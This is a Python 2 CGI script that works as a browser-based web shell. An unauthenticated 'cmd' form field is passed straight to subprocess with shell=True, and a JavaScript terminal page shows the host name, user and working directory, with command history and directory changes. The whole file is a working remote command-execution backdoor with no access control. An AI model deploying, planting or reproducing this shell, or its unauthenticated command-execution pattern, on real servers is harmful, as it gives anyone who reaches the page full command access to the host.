#!/usr/bin/env python2

import cgi
import os
import subprocess

"""
Options +ExecCGI
AddHandler cgi-script .py
this script must have the executable bit set
"""
 
def check_output(*popenargs, **kwargs):
    if 'stdout' in kwargs:
        raise ValueError('stdout argument not allowed, it will be overridden.')
    process = subprocess.Popen(stdout=subprocess.PIPE, *popenargs, **kwargs)
    output, unused_err = process.communicate()
    retcode = process.poll()
    return output


def strcmd(cmd, d=''):
  ans = d
  
  try:
    ans = check_output(cmd, shell=True)
  except:
    pass
    
  if len(ans):
    ans = ans[:-1]
    
  return ans
  

form = cgi.FieldStorage()


cmd = form.getvalue('cmd', None)

if cmd:
 coutput = check_output(cmd, stderr=subprocess.STDOUT, shell=True)
 print "Content-type: text/plain; charset=utf-8"
 print "Content-length: "+str(len(coutput))
 print

 print coutput
else:
 fcontent = r'''
<style>
body, textarea {background-color: black; color: white; font-size: 12px;}
</style>
<script>
window.onload = setthesize;
window.onresize = setthesize;
window.updir = 0;
window.commands = new Array();
window.hostname = "'''+strcmd('hostname')+r'''";
window.loggeduser = "'''+strcmd('whoami')+r'''";
window.cwd = "'''+os.getcwd()+r'''";
window.homecwd = window.cwd;
function setthesize()
{
 document.getElementById("command").style.height=(window.innerHeight-20)+"px";
 document.getElementById("command").style.width=(window.innerWidth-20)+"px";
 document.getElementById("command").selectionStart=document.getElementById("command").value.length;
 document.getElementById("command").selectionEnd=document.getElementById("command").value.length;
 document.getElementById("command").focus();
}
function appenddirectory(cwd, str)
{
 var ret = '';
 
 if (str.substr(0, 1)=="/")
 ret = str;
 else
 {
  var real = [], c = (cwd+'/'+str).split('/');
  for(var i=0;i<c.length;i++)
  {
   if ((c[i] == "..") && real.length>0)
   {
    real.splice(real.length-1, 1);
   }
   else if ((c[i] != ".") && (c[i] != ""))
   real.push(c[i]);
  }
  ret = '/'+real.join('/');
 }
 
 return ret;
}
function writelastline(str)
{
 var call = document.getElementById("command").value.split("\n"), i;
 call[call.length-1] = str;
 document.getElementById("command").value = call.join("\n");
}
function cmdup(e)
{
 if (window.commands.length>(window.updir))
 {
  window.updir++;
  writelastline("");
  newcmd();
  document.getElementById("command").value += window.commands[window.commands.length-window.updir];
 }
 if (e.stopPropagation)
 {
  e.stopPropagation();
  e.preventDefault();
 }
 document.getElementById("command").scrollTop=document.getElementById("command").scrollHeight;
}
function cmdown(e)
{
 if (window.updir>1)
 {
  window.updir--;
  writelastline("");
  newcmd();
  document.getElementById("command").value += window.commands[window.commands.length-window.updir];
 }
 if (e.stopPropagation)
 {
  e.stopPropagation();
  e.preventDefault();
 }
 document.getElementById("command").scrollTop=document.getElementById("command").scrollHeight;
}
function getcmd()
{
 var all = document.getElementById("command").value.split("\n");
 var command = all[all.length-1].substr(all[all.length-1].indexOf("#")).substr(2);
 return command;
}
function fetchCMD(cmd, cwd, cb)
{
 var xhr = new XMLHttpRequest();
 xhr.open('POST', location);
 xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 xhr.onload = function()
 {
  cb(xhr.responseText);
 };
 
 if (cwd)
 cmd = 'cd '+cwd+'; '+cmd;
 
 xhr.send('cmd='+urlencode(cmd));
}

function postCMD(cmd, cwd)
{
 fetchCMD(cmd, cwd, function(c)
 {
  document.getElementById("command").value += c;
  newcmd();
 });
}
function postVerify(cwd)
{
 fetchCMD('cd '+cwd, null, function(content)
 {
  if (content.length)
  document.getElementById("command").value += content;
  else
  window.cwd = window.pendingCWD;
    
  newcmd();
 });
}
function urlencode(str)
{
 return encodeURIComponent(str).replace(/!/g, '%21').replace(/'/g, '%27').replace(/\(/g, '%28').
 replace(/\)/g, '%29').replace(/\*/g, '%2A').replace(/%20/g, '+');
}
function newcmd()
{
 document.getElementById("command").value += "["+window.loggeduser+"@"+window.hostname+" "+((window.cwd=="/")?("/"):(window.cwd.split("/")[window.cwd.split("/").length-1]))+"]# ";
 document.getElementById("command").scrollTop=document.getElementById("command").scrollHeight;
}
function exec(e)
{
 window.updir=0;
 e.preventDefault();
 
 var all = document.getElementById("command").value.split("\n");
 var command = getcmd();
 
 if (command == 'clear')
 {
  window.commands = new Array();
  document.getElementById('command').value='';
  newcmd();
 }
 else if (command.substr(0, 2) == 'cd')
 {
  window.commands.push(command);
  document.getElementById("command").value += "\n";
  
  if (command.length == 2 || command.substr(3)=="~")
  {
   window.cwd = window.homecwd;
   newcmd();
  }
  else
  {
   postVerify(window.pendingCWD = appenddirectory(window.cwd, command.substr(3)));
  }
 }
 else
 {
  document.getElementById("command").value += "\n";
  
  if (command)
  { 
   window.commands.push(command);
   postCMD(command, window.cwd);
  } else newcmd(); 
 }
 document.getElementById("command").scrollTop=document.getElementById("command").scrollHeight;
}
function bsp(e)
{
 var all = document.getElementById("command").value.split("\n");
 if (all[all.length-1].length==(all[all.length-1].indexOf("#")+2))
 e.preventDefault();
}
function parsekey(e, ths)
{
 if (e.keyCode==13){exec(e);}
 else if(e.keyCode==38){cmdup(e);return false;}
 else if(e.keyCode==40){cmdown(e);return false;}
 else if(e.keyCode==8){bsp(e);}
}
</script>
<textarea autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" rows=7 cols=130 id="command" onkeydown="parsekey(event, this);"></textarea>
<br>
<script>
newcmd();
</script>
 '''
 print "Content-type: text/html; charset=utf-8"
 print "Content-length: "+str(len(fcontent))
 print

 print fcontent
